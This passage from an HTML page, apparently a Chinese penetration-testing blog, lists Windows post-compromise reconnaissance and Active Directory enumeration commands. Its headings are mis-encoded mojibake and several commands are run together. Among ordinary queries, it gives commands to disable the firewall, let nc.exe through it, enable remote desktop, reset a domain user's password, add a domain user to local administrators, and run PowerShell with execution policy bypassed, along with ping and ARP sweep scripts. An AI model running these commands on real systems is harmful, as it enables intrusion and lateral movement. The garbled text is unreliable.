title="06.æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„"></a>06.æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><h3 id="07-æŸ¥æ€è½¯"><a href="#07-æŸ¥æ€è½¯" class="headerlink" title="07.æŸ¥æ€è½¯"></a>07.æŸ¥æ€è½¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct GET displayName /Format:List</span><br></pre></td></tr></table></figure><h3 id="08-æŸ¥çœ‹å®‰è£…çš„ç¨‹åº"><a href="#08-æŸ¥çœ‹å®‰è£…çš„ç¨‹åº" class="headerlink" title="08.æŸ¥çœ‹å®‰è£…çš„ç¨‹åº"></a>08.æŸ¥çœ‹å®‰è£…çš„ç¨‹åº</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic product get  name,version</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure><h3 id="09-æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·"><a href="#09-æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·" class="headerlink" title="09.æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·"></a>09.æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">quser</span><br><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><h3 id="10-æŸ¥çœ‹ç½‘ç»œé…ç½®"><a href="#10-æŸ¥çœ‹ç½‘ç»œé…ç½®" class="headerlink" title="10.æŸ¥çœ‹ç½‘ç»œé…ç½®"></a>10.æŸ¥çœ‹ç½‘ç»œé…ç½®</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><h3 id="11-æŸ¥çœ‹è¿›ç¨‹ä¸ä¿¡æ¯"><a href="#11-æŸ¥çœ‹è¿›ç¨‹ä¸ä¿¡æ¯" class="headerlink" title="11.æŸ¥çœ‹è¿›ç¨‹ä¸ä¿¡æ¯"></a>11.æŸ¥çœ‹è¿›ç¨‹ä¸ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><h3 id="12-æŸ¥çœ‹å½“å‰ç™»å…¥åŸŸ"><a href="#12-æŸ¥çœ‹å½“å‰ç™»å…¥åŸŸ" class="headerlink" title="12.æŸ¥çœ‹å½“å‰ç™»å…¥åŸŸ"></a>12.æŸ¥çœ‹å½“å‰ç™»å…¥åŸŸ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><h3 id="13-è¿œç¨‹æ¡Œé¢å†å²è¿æ¥è®°å½•"><a href="#13-è¿œç¨‹æ¡Œé¢å†å²è¿æ¥è®°å½•" class="headerlink" title="13.è¿œç¨‹æ¡Œé¢å†å²è¿æ¥è®°å½•"></a>13.è¿œç¨‹æ¡Œé¢å†å²è¿æ¥è®°å½•</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /l</span><br></pre></td></tr></table></figure><h3 id="14-æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨"><a href="#14-æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨" class="headerlink" title="14.æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨"></a>14.æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><h3 id="15-æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯"><a href="#15-æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="15.æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯"></a>15.æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator</span><br></pre></td></tr></table></figure><h3 id="16-æŸ¥çœ‹æœ¬æœºæœåŠ¡ä¿¡æ¯"><a href="#16-æŸ¥çœ‹æœ¬æœºæœåŠ¡ä¿¡æ¯" class="headerlink" title="16.æŸ¥çœ‹æœ¬æœºæœåŠ¡ä¿¡æ¯"></a>16.æŸ¥çœ‹æœ¬æœºæœåŠ¡ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><h3 id="17-æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯"><a href="#17-æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯" class="headerlink" title="17.æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯"></a>17.æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><h3 id="18-æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"><a href="#18-æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡" class="headerlink" title="18.æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"></a>18.æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><h3 id="19-æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´"><a href="#19-æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´" class="headerlink" title="19.æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´"></a>19.æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><h3 id="20-è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯-é€šå¸¸åŒ…æ‹¬åŸŸç”¨æˆ·"><a href="#20-è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯-é€šå¸¸åŒ…æ‹¬åŸŸç”¨æˆ·" class="headerlink" title="20.è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯[é€šå¸¸åŒ…æ‹¬åŸŸç”¨æˆ·]"></a>20.è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯[é€šå¸¸åŒ…æ‹¬åŸŸç”¨æˆ·]</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><h3 id="21-æ˜¾ç¤ºè¿æ¥ä¼šè¯"><a href="#21-æ˜¾ç¤ºè¿æ¥ä¼šè¯" class="headerlink" title="21.æ˜¾ç¤ºè¿æ¥ä¼šè¯"></a>21.æ˜¾ç¤ºè¿æ¥ä¼šè¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h3 id="22-æŸ¥çœ‹å®‰è£…è¿‡çš„è¡¥ä¸"><a href="#22-æŸ¥çœ‹å®‰è£…è¿‡çš„è¡¥ä¸" class="headerlink" title="22.æŸ¥çœ‹å®‰è£…è¿‡çš„è¡¥ä¸"></a>22.æŸ¥çœ‹å®‰è£…è¿‡çš„è¡¥ä¸</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><h3 id="23-æŸ¥çœ‹å…±äº«åˆ—è¡¨"><a href="#23-æŸ¥çœ‹å…±äº«åˆ—è¡¨" class="headerlink" title="23.æŸ¥çœ‹å…±äº«åˆ—è¡¨"></a>23.æŸ¥çœ‹å…±äº«åˆ—è¡¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net sharewmic share get name,path,status</span><br></pre></td></tr></table></figure><h3 id="24-æŸ¥çœ‹è·¯ç”±è¡¨ä¸ARPç¼“å­˜è¡¨"><a href="#24-æŸ¥çœ‹è·¯ç”±è¡¨ä¸ARPç¼“å­˜è¡¨" class="headerlink" title="24.æŸ¥çœ‹è·¯ç”±è¡¨ä¸ARPç¼“å­˜è¡¨"></a>24.æŸ¥çœ‹è·¯ç”±è¡¨ä¸ARPç¼“å­˜è¡¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route printarp -a</span><br></pre></td></tr></table></figure><h3 id="25-é˜²ç«å¢™ç›¸å…³"><a href="#25-é˜²ç«å¢™ç›¸å…³" class="headerlink" title="25.é˜²ç«å¢™ç›¸å…³"></a>25.é˜²ç«å¢™ç›¸å…³</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable    #server 2003ä¹‹å‰ç‰ˆæœ¬å…³é—­é˜²ç«å¢™netsh advfirewall set allprofiles state off #server 2003ä¹‹åç‰ˆæœ¬å…³é—­é˜²ç«å¢™netsh firewall show config    #æŸ¥çœ‹é˜²ç«å¢™é…ç½®netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable    #server 2003ä¹‹å‰ç‰ˆæœ¬å…è®¸æŒ‡å®šç¨‹åºè¿æ¥netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;c:\nc.exe&quot;    #server 2003ä¹‹åå…è®¸æŒ‡å®šç¨‹åºè¿›å…¥netsh advfirewall firewall add rule name=&quot;allow nc&quot; dir=out action=allow program=&quot;c:\nc.exe&quot;    #server 2003ä¹‹åå…è®¸æŒ‡å®šç¨‹åºå‡ºå»netsh advfirewall firewall add rule name=&quot;RPC&quot; protocol=TCP dir=in localport=3389 action=allow #æ”¾è¡Œ3389netsh advfirewall set currentprofile logging filename &quot;c:\windows\temp\fw.log&quot;    #è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—æ–‡ä»¶ä½ç½®</span><br></pre></td></tr></table></figure><h3 id="26-æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ"><a href="#26-æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ" class="headerlink" title="26.æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ"></a>26.æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><h3 id="27-æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡"><a href="#27-æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡" class="headerlink" title="27.æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡"></a>27.æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber    #æŸ¥çœ‹è¿œç¨‹è¿æ¥ç«¯å£(RDP) 3389ç«¯å£åå…­è¿›åˆ¶ä¸º0xd3d</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1    #server 2003ç‰ˆæœ¬ä»¥ä¸‹å¼€å¯3389</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 0    #server 2003ç‰ˆæœ¬ä»¥ä¸‹å…³é—­3389</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1    #server 2003ç‰ˆæœ¬ä»¥ä¸Šå¼€å¯3389(win7å¯ä»¥)</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 0    #server 2003ç‰ˆæœ¬ä»¥ä¸Šå…³é—­3389</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1    #server 2008/2012ç‰ˆæœ¬å¼€å¯3389(win7ä¸å¯ä»¥)</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f    #server 2008/2012ç‰ˆæœ¬å¼€å¯3389</span><br></pre></td></tr></table></figure><h2 id="0x02-åŸŸå†…ä¿¡æ¯æ”¶é›†"><a href="#0x02-åŸŸå†…ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x02.åŸŸå†…ä¿¡æ¯æ”¶é›†"></a>0x02.åŸŸå†…ä¿¡æ¯æ”¶é›†</h2><h3 id="01-æŸ¥çœ‹åŸŸç”¨æˆ·ä¿¡æ¯"><a href="#01-æŸ¥çœ‹åŸŸç”¨æˆ·ä¿¡æ¯" class="headerlink" title="01.æŸ¥çœ‹åŸŸç”¨æˆ·ä¿¡æ¯"></a>01.æŸ¥çœ‹åŸŸç”¨æˆ·ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user /domain    #æ˜¾ç¤ºæ‰€åœ¨åŸŸçš„ç”¨æˆ·åå•</span><br><span class="line">net user åŸŸç”¨æˆ· /domain    #è·å–åŸŸç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯</span><br><span class="line">net user /domain xxx 123456    #ä¿®æ”¹åŸŸç”¨æˆ·å¯†ç ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™</span><br></pre></td></tr></table></figure><h3 id="02-æŸ¥è¯¢åŸŸä¿¡ä»»åˆ—è¡¨"><a href="#02-æŸ¥è¯¢åŸŸä¿¡ä»»åˆ—è¡¨" class="headerlink" title="02.æŸ¥è¯¢åŸŸä¿¡ä»»åˆ—è¡¨"></a>02.æŸ¥è¯¢åŸŸä¿¡ä»»åˆ—è¡¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts /all_trusts /v</span><br></pre></td></tr></table></figure><h3 id="03-è¿”å›åŸŸæ§ä¸å…¶å¯¹åº”çš„IP"><a href="#03-è¿”å›åŸŸæ§ä¸å…¶å¯¹åº”çš„IP" class="headerlink" title="03.è¿”å›åŸŸæ§ä¸å…¶å¯¹åº”çš„IP"></a>03.è¿”å›åŸŸæ§ä¸å…¶å¯¹åº”çš„IP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nltest /dsgetdc:jiye</span><br><span class="line">nslookup -type=SRV _ldap._tcp    #æŸ¥çœ‹åŸŸæ§ä¸»æœºå</span><br><span class="line">netdom query pdc    #æŸ¥è¯¢åŸŸæ§</span><br></pre></td></tr></table></figure><h3 id="04-åŸŸç”¨æˆ·ç»„ç›¸å…³æŸ¥è¯¢"><a href="#04-åŸŸç”¨æˆ·ç»„ç›¸å…³æŸ¥è¯¢" class="headerlink" title="04.åŸŸç”¨æˆ·ç»„ç›¸å…³æŸ¥è¯¢"></a>04.åŸŸç”¨æˆ·ç»„ç›¸å…³æŸ¥è¯¢</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain    #æŸ¥çœ‹åŸŸç®¡ç†å‘˜åˆ—è¡¨net group &quot;domain controllers&quot; /domain    #æŸ¥çœ‹åŸŸæ§åˆ¶å™¨(å¦‚æœæœ‰å¤šå°)net group &quot;domain computers&quot; /domain    #æŸ¥çœ‹åŸŸæœºå™¨net group &quot;domain users&quot; /domain    #æŸ¥çœ‹åŸŸå…¨éƒ¨ç”¨æˆ·net group /domain    #æŸ¥çœ‹åŸŸé‡Œå·¥ä½œç»„net localgroup administrators    #æŸ¥çœ‹æœ¬æœºç®¡ç†å‘˜[é€šå¸¸å«æœ‰åŸŸç”¨æˆ·]net localgroup administrators /domain    #ç™»å…¥æœ¬æœºçš„åŸŸç®¡ç†å‘˜net localgroup administrators workgroup\user /add    #åŸŸç”¨æˆ·æ·»åŠ åˆ°æœ¬æœº</span><br></pre></td></tr></table></figure><h2 id="04-è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯-åŸŸæ§"><a href="#04-è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯-åŸŸæ§" class="headerlink" title="04.è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯(åŸŸæ§)"></a>04.è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯(åŸŸæ§)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get /all    #è·å–åŸŸå†…ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯dsquery user        #æŸ¥çœ‹å­˜åœ¨ç”¨æˆ·dsquery computer    #æŸ¥è¯¢ç›®å½•ä¸­çš„è®¡ç®—æœºdsquery contact        #æŸ¥è¯¢ç›®å½•ä¸­çš„è”ç³»äººdsquery subnet        #æŸ¥è¯¢ç›®å½•ä¸­çš„å­ç½‘dsquery group        #æŸ¥è¯¢ç›®å½•ä¸­çš„ç»„dsquery ou            #æŸ¥è¯¢ç›®å½•ä¸­çš„ç»„ç»‡å•ä½dsquery site        #æŸ¥è¯¢ç›®å½•ä¸­çš„ç«™ç‚¹dsquery server        #æŸ¥è¯¢ç›®å½•ä¸­çš„AD DC/LDSå®ä¾‹dsquery user        #æŸ¥è¯¢ç›®å½•ä¸­çš„ç”¨æˆ·dsquery quota        #æŸ¥è¯¢ç›®å½•ä¸­çš„é…é¢è§„å®šdsquery partition    #æŸ¥è¯¢ç›®å½•ä¸­çš„åˆ†åŒºdsquery * -            #ç”¨é€šç”¨çš„LDAPæŸ¥è¯¢ç›®å½•ä¸­çš„ä»»ä½•å¯¹è±¡</span><br></pre></td></tr></table></figure><h3 id="05-åŸŸä¸»æœºç›¸å…³æŸ¥è¯¢"><a href="#05-åŸŸä¸»æœºç›¸å…³æŸ¥è¯¢" class="headerlink" title="05.åŸŸä¸»æœºç›¸å…³æŸ¥è¯¢"></a>05.åŸŸä¸»æœºç›¸å…³æŸ¥è¯¢</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view    #æŸ¥çœ‹åŒä¸€åŸŸå†…æœºå™¨åˆ—è¡¨net view \\IP    #æŸ¥çœ‹æŸIPå…±äº«net view \\DC    #æŸ¥çœ‹DCè®¡ç®—æœºçš„å…±äº«èµ„æºåˆ—è¡¨net view /domain    #æŸ¥çœ‹å†…ç½‘å­˜åœ¨å¤šå°‘ä¸ªåŸŸnet view /domain:jiye    #æŸ¥çœ‹jiyeåŸŸä¸­çš„æœºå™¨åˆ—è¡¨</span><br></pre></td></tr></table></figure><h3 id="06-æŸ¥çœ‹åŸŸç”¨æˆ·å¯†ç è¿‡æœŸç­‰ä¿¡æ¯"><a href="#06-æŸ¥çœ‹åŸŸç”¨æˆ·å¯†ç è¿‡æœŸç­‰ä¿¡æ¯" class="headerlink" title="06.æŸ¥çœ‹åŸŸç”¨æˆ·å¯†ç è¿‡æœŸç­‰ä¿¡æ¯"></a>06.æŸ¥çœ‹åŸŸç”¨æˆ·å¯†ç è¿‡æœŸç­‰ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure><h3 id="07-åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨"><a href="#07-åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨" class="headerlink" title="07.åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨"></a>07.åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /allsysteminfonet config workstation    #å½“å‰ç™»å…¥åŸŸ</span><br></pre></td></tr></table></figure><h3 id="08-åˆ¤æ–­ä¸»åŸŸ"><a href="#08-åˆ¤æ–­ä¸»åŸŸ" class="headerlink" title="08.åˆ¤æ–­ä¸»åŸŸ"></a>08.åˆ¤æ–­ä¸»åŸŸ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domainæ‰§è¡Œä»¥ä¸Šå‘½ä»¤é€šå¸¸æœ‰ä¸‰ç§æƒ…å†µï¼š1.å­˜åœ¨åŸŸï¼Œä½†å½“å‰ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ·ï¼Œä¼šå‡ºç°æ‹’ç»è®¿é—®ç»“æœ2.å­˜åœ¨åŸŸï¼Œä½†å½“å‰ç”¨æˆ·æ˜¯åŸŸç”¨æˆ·ï¼Œå¾—åˆ°æ­£å¸¸è¾“å‡º3.å½“å‰ç¯å¢ƒä¸ºå·¥ä½œç»„ï¼Œä¸å­˜åœ¨åŸŸï¼Œä¼šå‡ºç°æ‰¾ä¸åˆ°åŸŸæ§ä¿¡æ¯</span><br></pre></td></tr></table></figure><h3 id="09-åˆ©ç”¨NetBios-ç½‘ç»œé‚»å±…-æ¢æµ‹å†…ç½‘"><a href="#09-åˆ©ç”¨NetBios-ç½‘ç»œé‚»å±…-æ¢æµ‹å†…ç½‘" class="headerlink" title="09.åˆ©ç”¨NetBios(ç½‘ç»œé‚»å±…)æ¢æµ‹å†…ç½‘"></a>09.åˆ©ç”¨NetBios(ç½‘ç»œé‚»å±…)æ¢æµ‹å†…ç½‘</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exeæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥æ‰«æå¼€æ”¾NetBiosåç§°æœåŠ¡å™¨nbtscan-1.0.35.exe 10.10.10.0/2410.10.10.10     JIYE\DC                         SHARING DC10.10.10.20     JIYE\WIN7DC1                    SHARING*timeout (normal end of scan)</span><br></pre></td></tr></table></figure><h3 id="10-ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘"><a href="#10-ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘" class="headerlink" title="10.ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘"></a>10.ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&quot;</span><br></pre></td></tr></table></figure><p><code>vbsè„šæœ¬æ¢æµ‹</code></p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">strSubNet = <span class="string">&quot;10.10.10.&quot;</span> </span><br><span class="line"><span class="keyword">Set</span> objFSO= <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>) </span><br><span class="line"><span class="keyword">Set</span> objTS = objfso.CreateTextFile(<span class="string">&quot;C:\Windows\Temp\Result.txt&quot;</span>)  </span><br><span class="line"><span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> <span class="number">254</span> </span><br><span class="line">strComputer = strSubNet &amp; i </span><br><span class="line">blnResult = Ping(strComputer) </span><br><span class="line"><span class="keyword">If</span> blnResult = <span class="literal">True</span> <span class="keyword">Then</span> </span><br><span class="line">objTS.WriteLine strComputer &amp; <span class="string">&quot; is alive ! :) &quot;</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"> <span class="keyword">Next</span>  </span><br><span class="line"> </span><br><span class="line">objTS.Close </span><br><span class="line">WScript.Echo <span class="string">&quot; All Ping scan, All Done!) &quot;</span>   </span><br><span class="line"><span class="keyword">Function</span> Ping(strComputer) </span><br><span class="line"><span class="keyword">Set</span> objWMIService = <span class="built_in">GetObject</span>(<span class="string">&quot;winmgmts:\\.\root\cimv2&quot;</span>) </span><br><span class="line"><span class="keyword">Set</span> colItems = objWMIService.ExecQuery(<span class="string">&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot;</span> &amp; strComputer &amp; <span class="string">&quot;&#x27;&quot;</span>) </span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> objItem <span class="keyword">In</span> colItems </span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">case</span> objItem.StatusCode </span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span> </span><br><span class="line">Ping = <span class="literal">True</span> </span><br><span class="line"><span class="keyword">Case</span> <span class="keyword">Else</span> </span><br><span class="line">Ping = <span class="literal">False</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">select</span> </span><br><span class="line"><span class="keyword">Exit</span> <span class="keyword">For</span> </span><br><span class="line"><span class="keyword">Next</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span> </span><br><span class="line"></span><br><span class="line">#cscript <span class="number">1.</span>vps æ‰§è¡Œ</span><br></pre></td></tr></table></figure><h3 id="11-ARPæ‰«ææ¢æµ‹å†…ç½‘"><a href="#11-ARPæ‰«ææ¢æµ‹å†…ç½‘" class="headerlink" title="11.ARPæ‰«ææ¢æµ‹å†…ç½‘"></a>11.ARPæ‰«ææ¢æµ‹å†…ç½‘</h3><h4 id="01-arp-scanæ‰«æå·¥å…·"><a href="#01-arp-scanæ‰«æå·¥å…·" class="headerlink" title="01.arp-scanæ‰«æå·¥å…·"></a>01.arp-scanæ‰«æå·¥å…·</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan.exe -t 10.10.10.0/24</span><br></pre></td></tr></table></figure><h4 id="02-Empireä¸­çš„arpscanæ¨¡å—"><a href="#02-Empireä¸­çš„arpscanæ¨¡å—" class="headerlink" title="02.Empireä¸­çš„arpscanæ¨¡å—"></a>02.Empireä¸­çš„arpscanæ¨¡å—</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell/situational_awareness/network/arpscan</span><br></pre></td></tr></table></figure><h4 id="03-Nishangä¸­çš„Invoke-ARPScan-ps1"><a href="#03-Nishangä¸­çš„Invoke-ARPScan-ps1" class="headerlink" title="03.Nishangä¸­çš„Invoke-ARPScan.ps1"></a>03.Nishangä¸­çš„Invoke-ARPScan.ps1</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -Command &quot;&amp; &#123;Import-Module C:\Users\Administrator\Desktop\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 10.10.10.0/24&#125;&quot; &gt;&gt; 